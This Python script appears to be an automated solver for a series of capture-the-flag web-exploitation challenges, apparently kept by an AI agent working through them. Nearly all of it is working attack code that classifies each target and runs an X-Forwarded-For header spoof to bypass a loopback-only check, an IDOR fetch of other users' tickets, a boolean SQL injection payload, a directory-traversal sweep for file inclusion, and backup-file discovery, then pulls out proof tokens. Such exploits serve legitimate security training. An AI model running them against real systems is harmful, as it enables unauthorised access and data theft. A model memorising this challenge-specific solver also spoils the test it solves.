#!/usr/bin/env python3
"""Solver for web-exploitation-day-23-forwarded-misgivings (release day 27).

No GM calls here - only talks to target origins named in a start.json you
already own (see AGENTS.md / web-worker-lessons.md discipline). Derives
routes/payloads from the live target; never hard-codes per-attempt answers.

Own bug class: "trusted_reverse_proxy" (Micronaut). /api/clues discloses a
feature_route that 403s with {"error":"loopback_only","evaluated_client":<ip>}
unless the client IP the app evaluates is 127.0.0.1. The app blindly trusts
a client-supplied X-Forwarded-For header as the real client IP (no actual
trusted-proxy allowlist) - send X-Forwarded-For: 127.0.0.1 and the same
request returns {"ok":true,"effect":"proxy_trust_admin_bypass","evidence":
"proof_..."}. Other forwarded headers (X-Real-IP, X-Forwarded-Host,
X-Forwarded-Proto) do nothing; only X-Forwarded-For matters here.

Mastery pulls in the expected earlier classes (see web-worker-lessons.md):
backup exposure, IDOR, group-close SQLi, PHP LFI, plus this family's own
proxy-trust bypass - classify each target independently via its root page
content, don't assume the family's own bug.
"""
import json
import re
import sys
import urllib.error
import urllib.parse
import urllib.request
import http.cookiejar

UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
TIMEOUT = 20
PROOF_RE = re.compile(r"proof_[0-9a-fA-F]{16,}")


class Target:
    def __init__(self, base):
        self.base = base.rstrip("/")
        self.cj = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(self.cj))

    def get(self, path, extra_headers=None):
        headers = {"User-Agent": UA}
        if extra_headers:
            headers.update(extra_headers)
        req = urllib.request.Request(self.base + path, headers=headers)
        try:
            with self.opener.open(req, timeout=TIMEOUT) as r:
                return r.status, r.read().decode(errors="replace")
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode(errors="replace")


def rec_proxy_trust_bypass(t):
    """This family's own bug: X-Forwarded-For: 127.0.0.1 flips a loopback_only
    gate on /api/clues's feature_route."""
    status, body = t.get("/api/clues")
    clue = json.loads(body)
    if clue.get("deployment") != "trusted_reverse_proxy":
        return None
    route = clue["feature_route"]
    status, body = t.get(route, {"X-Forwarded-For": "127.0.0.1"})
    match = PROOF_RE.search(body)
    return match.group(0) if match else None


def rec_backup(t):
    """robots.txt Disallow -> open directory listing -> named backup file."""
    status, body = t.get("/robots.txt")
    m = re.search(r"Disallow:\s*(/\S+)", body)
    if not m:
        return None
    status, body = t.get(m.group(1))
    links = re.findall(r'href="([^"]+)"', body)
    for link in links:
        if link.startswith(m.group(1)) or link.startswith("/"):
            status, body = t.get(link if link.startswith("/") else m.group(1) + link)
            match = PROOF_RE.search(body)
            if match:
                return match.group(0)
    return None


def rec_idor(t):
    """Root establishes a session; an activity feed discloses a foreign
    object id/owner outside the normal workspace; fetch that id's object API
    with the same session."""
    t.get("/")
    status, body = t.get("/api/activity")
    try:
        data = json.loads(body)
    except Exception:
        return None
    own_ids = set()
    foreign_ids = []
    for ev in data.get("events", []):
        cid = ev.get("case_id")
        if ev.get("visibility") == "workspace":
            own_ids.add(cid)
        else:
            foreign_ids.append(cid)
    for cid in foreign_ids:
        status, body = t.get(f"/api/tickets/{cid}")
        match = PROOF_RE.search(body)
        if match:
            return match.group(0)
    return None


def rec_sqli_group_close(t):
    """Search form action/input name derived from the root page; group-closing
    boolean payload (day-19's reconfirmed exact string)."""
    status, body = t.get("/")
    m = re.search(r"<form[^>]*action=['\"]([^'\"]+)['\"][^>]*>.*?<input[^>]*name=['\"](\w+)['\"]", body, re.S)
    action, param = (m.group(1), m.group(2)) if m else ("/lookup", "q")
    payload = "') OR ('1'='1"
    status, body = t.get(f"{action}?{urllib.parse.urlencode({param: payload})}")
    match = PROOF_RE.search(body)
    return match.group(0) if match else None


def rec_lfi(t):
    """PHP viewer link discloses endpoint/param; bounded ../-depth sweep (1-8)
    against the documented default objective path, then one absolute fallback."""
    status, body = t.get("/")
    link = re.search(r'href="([^"]*\.php)\?(\w+)=', body)
    endpoint, param = (link.group(1), link.group(2)) if link else ("/handbook.php", "doc")
    rel = "run/huntress/objective.txt"
    for depth in range(1, 9):
        payload = "../" * depth + rel
        status, body = t.get(f"{endpoint}?{urllib.parse.urlencode({param: payload})}")
        match = PROOF_RE.search(body)
        if match:
            return match.group(0)
    status, body = t.get(f"{endpoint}?{urllib.parse.urlencode({param: '/' + rel})}")
    match = PROOF_RE.search(body)
    return match.group(0) if match else None


def classify_and_recover(base):
    t = Target(base)
    for rec in (rec_proxy_trust_bypass, rec_idor, rec_lfi, rec_sqli_group_close, rec_backup):
        try:
            result = rec(t)
        except Exception:
            result = None
        if result:
            return result
    return None


if __name__ == "__main__":
    for url in sys.argv[1:]:
        print(url, "->", classify_and_recover(url))
